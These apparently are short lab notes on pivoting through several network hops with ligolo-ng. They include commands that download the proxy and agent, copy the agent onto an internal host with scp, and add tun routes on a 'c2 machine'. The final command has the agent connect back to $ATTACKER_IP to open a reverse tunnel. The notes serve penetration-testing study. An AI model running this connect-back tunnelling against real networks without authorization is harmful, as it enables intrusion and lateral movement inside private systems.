# multipivoting

When you need to do multip hops to get to a host, use ligolo-ng

https://olivierkonate.medium.com/pivoting-made-easy-with-ligolo-ng-17a4a8a539df


## Setup

ligolo-ng listens on port 11601 by default.


https://github.com/nicocha30/ligolo-ng

## Usage (proxy)

https://docs.ligolo.ng/

Agent and Proxy binaries available on github

https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xvf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
sudo ./proxy -selfcert
ifcreate --name foobar
route_add --name foobar --route 10.x.x.x/32
```

## Usage (agent)

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar -xvf ligolo-ng_agent_0.8.2_linux_amd64
```

If github is blocked, you can host it on anther server with access

`python3 -m http.server`

or scp

```bash
scp -i ~/.ssh/malhare_ed25519 ./agent borkinator@10.200.171.11:~/
```

Then add routs on c2 machine

```bash
ip tuntap add user root mod tun ligolo
ip link set ligolo up
ip route
ip route add 10.200.171.101/32 dev ligolo
ip route
```

Then connect back to the c2 machine. 

> Note that ATTACKER_IP is not the ip of the kali box, but rather the ip of the `tun0` network device

./agent -connect $ATTACKER_IP:11601



